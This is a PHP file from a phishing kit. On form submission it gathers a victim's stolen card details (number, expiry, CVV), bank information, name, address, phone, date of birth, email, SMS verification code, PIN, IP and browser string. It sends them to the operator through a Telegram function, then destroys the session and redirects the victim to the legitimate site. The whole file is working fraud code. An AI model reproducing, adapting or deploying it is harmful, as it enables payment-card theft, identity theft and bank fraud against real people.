<?php 
require_once 'panel.php' ;

// FUCKED Config Start

if(isset($_POST['submit'])) {
        
    $subject = " VICTIM REDIRECTED FROM SCAM $ip";
    $rezdata = "🕵🏻‍♂️ VICTIM REDIRECTED ".SCAM_NAME." ".FLAG."

💳 Card holder : ".$_SESSION['scch']."
💳 Card number : ".$_SESSION['sccn']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

🏛️ BANK INFO'S ".SCAM_NAME." 🏛️

🏛️ Banque : ".$_SESSION['bank']."
🏛️ Niveau : ".$_SESSION['level']."
🏛️ Type : ".$_SESSION['type']."
🏛️ Pays : ".$_SESSION['country']."

🥷🏻 INFOZ ".SCAM_NAME." 🥷🏻

🥷🏻 Name : ".$_SESSION['sname']."
🥷🏻 Adresse : ".$_SESSION['saddress']."
🥷🏻 Country : ".$_SESSION['scountry']."
🥷🏻 City : ".$_SESSION['scity']."
🥷🏻 Phone : ".$_SESSION['sphone']."
🥷🏻 Dob : ".$_SESSION['sdate']."

💌 Email : ".$_SESSION['semail']."
    
🍬 Sms : ".$_SESSION['scode']."

🔑 Pin : ".$_SESSION['spin']."

🌐 Victim Ip : $ip
💠 OS : $agent
";

    sendTelegram($rezdata);
    
    session_destroy();
    header("Location: ".WEBSITE);
}
// FUCKED Config END